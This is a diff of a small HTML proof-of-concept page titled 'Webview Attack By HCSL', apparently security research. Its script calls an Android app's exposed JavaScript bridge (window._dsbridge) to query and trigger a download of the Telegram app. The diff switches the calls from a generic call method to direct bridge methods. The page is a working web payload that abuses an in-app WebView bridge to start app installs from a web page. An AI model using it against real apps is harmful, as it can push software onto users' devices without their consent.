@@ -5,10 +5,11 @@
     <title>Webview Attack By HCSL</title>
     <script>
         function downloadApp(){
-        var queryAppInformation_parameters = "{\"data\":{\"apkId\":\"org.telegram.messenger\"}}";
-        window._dsbridge.call("download.queryAppInformation",queryAppInformation_parameters);
-        var downloadButtonOnClick_parameters = "{\"data\":{\"packageName\":\"org.telegram.messenger\"}}";
-        window._dsbridge.call("download.downloadButtonOnClick",downloadButtonOnClick_parameters)
+        var handler;
+        var queryAppInformation_parameters = {'apkId':'org.telegram.messenger'};
+        window._dsbridge.queryAppInformation(queryAppInformation_parameters,handler);
+        var downloadButtonOnClick_parameters = {'packageName':'org.telegram.messenger'};
+        window._dsbridge.downloadButtonOnClick(downloadButtonOnClick_parameters,handler);
         }
     </script>
 </head>
